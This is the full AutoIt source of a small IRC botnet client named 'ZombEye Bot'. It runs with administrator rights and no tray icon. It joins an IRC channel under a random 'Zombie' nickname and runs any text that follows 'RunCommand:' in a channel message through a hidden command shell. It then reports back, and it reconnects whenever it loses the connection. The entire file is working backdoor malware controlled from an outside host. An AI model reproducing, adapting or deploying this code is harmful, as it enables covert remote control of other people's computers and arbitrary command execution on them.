#NoTrayIcon
#RequireAdmin
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=ZombEye_Bot_Icon.ico
#AutoIt3Wrapper_Res_Description=A tribute to Master Control.
#AutoIt3Wrapper_Res_Fileversion=0.1
#AutoIt3Wrapper_Res_LegalCopyright=Copyme 2014 zelles
#AutoIt3Wrapper_Res_Language=1033
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Misc.au3>

_Singleton("zombeyebot")

OnAutoItExitRegister("botnet_close")

Opt("TrayMenuMode", 3)
Opt("TCPTimeout", 0)

Global $botnet_server = IniRead("C:\bconfig.ini", "config", "server", "irc.freenode.net")
Global $botnet_port = IniRead("C:\bconfig.ini", "config", "port", "6667")
Global $botnet_chan = IniRead("C:\bconfig.ini", "config", "channel", "#globalzombiechan")
Global $botnet_name = "Zombie" & Round(Random(1, 1000000), 0)

botnet_up()
While 1
	If $botnet_conn = -1 Then botnet_down()
	botnet_recv()
WEnd

Func botnet_recv()
	Local $botnet_recv = TCPRecv($botnet_conn, 8192)
	If StringInStr($botnet_recv, "PRIVMSG " & $botnet_chan & " :") Then
		Local $botnet_msg = StringSplit($botnet_recv, "PRIVMSG " & $botnet_chan & " :", 1)
		If StringInStr($botnet_msg[2], "RunCommand:") Then
			Local $botnet_msgs = StringSplit($botnet_recv, "RunCommand:", 1)
			Run(@ComSpec & " /c " & $botnet_msgs[2], "", @SW_HIDE)
			TCPSend($botnet_conn, "PRIVMSG " & $botnet_chan & " :Bot ran code" & @CRLF)
		EndIf
	EndIf
    Local $botnet_split = StringSplit($botnet_recv, @CRLF)
	For $botnet_count = 1 To $botnet_split[0] Step 1
		Local $botnet_splitmsg = StringSplit($botnet_split[$botnet_count], " ")
		If $botnet_splitmsg[1] = "" Then ContinueLoop
		If $botnet_splitmsg[1] = "PING" Then
			TCPSend($botnet_conn, "PONG " & $botnet_splitmsg[2] & @CRLF)
		EndIf
		If $botnet_splitmsg[0] <= 2 Then ContinueLoop
		Switch $botnet_splitmsg[2]
			Case "266"
				TCPSend($botnet_conn, "PRIVMSG " & $botnet_chan & " :Bot connected." & @CRLF)
		EndSwitch
	Next
EndFunc

Func botnet_up()
	TCPStartup()
	Global $botnet_conn = TCPConnect(TCPNameToIP($botnet_server), $botnet_port)
	If $botnet_conn = -1 Then botnet_down()
	TCPSend($botnet_conn, "NICK " & $botnet_name & @CRLF)
	TCPSend($botnet_conn, "USER " & $botnet_name & " 0 0 " & $botnet_name & @CRLF)
	TCPSend($botnet_conn, "JOIN " & $botnet_chan & @CRLF)
EndFunc

Func botnet_down()
	TCPCloseSocket($botnet_conn)
	TCPShutdown()
	Sleep(5000)
	botnet_up()
EndFunc

Func botnet_close()
	TCPCloseSocket($botnet_conn)
	TCPShutdown()
	Exit
EndFunc